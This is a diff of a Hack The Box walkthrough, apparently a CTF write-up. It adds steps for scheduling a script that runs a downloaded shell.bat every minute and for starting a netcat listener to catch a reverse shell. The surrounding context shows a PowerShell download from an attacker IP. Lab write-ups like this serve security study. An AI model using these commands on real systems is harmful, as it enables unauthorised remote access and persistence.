@@ -332,3 +332,15 @@ powershell wget http://10.10.14.4/shell.bat -outfile shell.bat
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1893a69b-a164-445c-8f62-983c8a3a76b0)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/0be0eb33-940a-4fb2-88c0-9f47b2832825)
+
+- Add shell script foobar to call shell.bat and save settings
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e1fc487c-22e3-4c37-bf34-54c4db37395f)
+
+- Add schedule to call script every 1 minute and save settings
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/989e6112-739d-4a46-90fb-49c53e485cd8)
+
+
+- Setup listener on attacking machine
+```CSS
+rlwrap nc -nlvvp 443
+```
